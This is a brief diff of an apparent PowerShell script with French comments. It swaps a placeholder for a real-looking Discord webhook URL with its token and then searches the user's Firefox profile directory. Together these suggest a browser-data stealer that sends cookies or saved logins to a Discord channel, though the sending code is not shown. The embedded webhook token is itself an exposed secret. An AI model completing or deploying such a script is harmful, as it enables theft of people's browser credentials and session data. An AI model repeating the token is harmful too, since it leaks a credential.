@@ -1,5 +1,5 @@
 # --- CONFIGURATION ---
-$hook = "TON_URL_WEBHOOK_DISCORD"
+$hook = "https://discord.com/api/webhooks/1486345183325978734/RPhcGENfxMFPENJ_v8u7bmoHsQaKlttoSVc91m3rBnqzFaby8tj67U7RGTxhB9w14AAi"
 
 # --- RECHERCHE DYNAMIQUE DU BON PROFIL ---
 $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
